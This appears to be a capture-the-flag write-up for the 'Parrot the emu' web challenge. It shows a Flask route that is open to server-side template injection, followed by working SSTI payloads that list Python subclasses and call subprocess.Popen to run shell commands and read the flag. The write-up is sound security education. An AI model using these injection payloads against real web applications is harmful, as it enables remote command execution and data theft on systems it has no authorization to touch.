* * *
![image](https://github.com/user-attachments/assets/744acab1-abef-48c8-babd-c61ed1646cc9)

* * *

### **Challenges**

### **Web**

-     Parrot the emu
-     Zoo feedback form
-     Co2
-     Confusion

---------------------------------

### Web

### Challenge: Parrot the emu

----------------------------------

![image](https://github.com/user-attachments/assets/8f1e8226-6491-4ec6-8705-30129f0adc5e)


- The index route `/` is the vulnerable part of the web app's code. The index page passes the `user_input` variable  to  the `render_template_string()` which is vulnerable to server side template injection in flask web apps' code.It allows an attacker to inject code into templaates.

      @app.route('/', methods=['GET', 'POST'])
      def vulnerable():
          chat_log = []
      
          if request.method == 'POST':
              user_input = request.form.get('user_input')
              try:
                  result = render_template_string(user_input)
              except Exception as e:
                  result = str(e)
      
              chat_log.append(('User', user_input))
              chat_log.append(('Emu', result))
          
          return render_template('index.html', chat_log=chat_log)

- Testing our little fact by executing \{\{7*7\}\},the server returned the value `49`

![image](https://github.com/user-attachments/assets/f30a52a9-2651-4f55-8e01-c577b0da806b)

### RCE

- I used the payload \{\{''.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()\}\} to access the classes available

![image](https://github.com/user-attachments/assets/a4b3b2a7-ca56-4dbd-812d-d42543db5721)

- After checking the list of available classes, I got shell command access with class `subprocess.Popen` on index `213`

       Payload: {{''.__class__.__base__.__subclasses__()[213]}}

![image](https://github.com/user-attachments/assets/ce45878b-c7f2-4b2a-9005-6784a09b30a3)

### Reading the flag

- Flag payload

      Payload: {{''.__class__.__base__.__subclasses__()[213]("cat flag",shell=True,stdout=-1).communicate()}}

![image](https://github.com/user-attachments/assets/9312e1e3-ace1-42cc-8fff-53d6714c7bda)

- Flag-:```DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}```

  


